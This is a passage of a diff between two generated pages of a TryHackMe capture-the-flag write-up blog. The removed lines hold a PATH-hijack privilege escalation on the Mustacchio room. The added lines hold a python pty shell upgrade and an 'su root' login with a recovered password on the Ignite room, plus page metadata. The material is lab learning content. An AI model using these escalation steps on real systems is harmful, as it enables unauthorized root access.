-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "/bin/sh" &gt; tail
-$ chmod 777 tail
-$ export PATH=/tmp.$PATH
-$ cd /home/joe/
-$ ./live_log
+<p><strong><code class="language-plaintext highlighter-rouge">Password: mememe</code></strong></p>
+
+<p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>
+
+<p>First, let’s call a shell using python. Then let’s try logging in.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ su root
+Password: mememe
 </code></pre></div></div>
 
-<p>And we are inside. To be frank, I don’t fully understand the logic of raising authority, I’ll go over it a little later.
-But now we can get to root.txt.</p>
+<p>It worked :D. We have successfully rooted.</p>
 
-<p><img src="/assets/img/tryhackme/mustacchio/root-flag.png" alt="root-flag"></p>
+<p><img src="/assets/img/tryhackme/ignite/privesc.png" alt="privesc"></p>
+
+<p>Now we can get to root.txt let’s get the flag.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/root-flag.png" alt="root-flag"></p>
 
 <p><br></p>
 
@@ -982,7 +799,7 @@ But now we can get to root.txt.</p>
   </div>
   <div class="post__footer">
     <p class="post__date">
-      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 19, 2023</p>
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 20, 2023</p>
     <div class="post__categories">
       
       
@@ -995,11 +812,11 @@ But now we can get to root.txt.</p>
         <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
         <span class="post__tags-container">
           
-          <span class="post__tags-item">xxe,</span>
+          <span class="post__tags-item">ctf,</span>
           
           <span class="post__tags-item">privesc,</span>
           
-          <span class="post__tags-item">enumeraton</span>
+          <span class="post__tags-item">exploit</span>
           
         </span>
       </p>
@@ -1013,8 +830,8 @@ But now we can get to root.txt.</p>
 <div id="disqus_thread"></div>
 <script>
     var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/tryhackme-mustacchio/';
-    this.page.identifier = '/tryhackme-mustacchio';
+    this.page.url = 'http://localhost:4000/tryhackme-ignite/';
+    this.page.identifier = '/tryhackme-ignite';
     
     };
 
@@ -1053,15 +870,15 @@ But now we can get to root.txt.</p>
   {
     "@context": "https://schema.org",
     "@type": "Article",
-    "headline": "TryHackMe - Mustacchio",
+    "headline": "TryHackMe - Ignite",
     "author": {
       "@type": "Person",
       "name": ""
     },
-    "datePublished": "2023-03-19 00:00:00 +0300",
+    "datePublished": "2023-03-20 00:00:00 +0300",
     "mainEntityOfPage": {
       "@type": "WebPage",
-      "@id": "http://localhost:4000/tryhackme-mustacchio/"
+      "@id": "http://localhost:4000/tryhackme-ignite/"
     },
     "articleSection": "TryHackMe"
   }
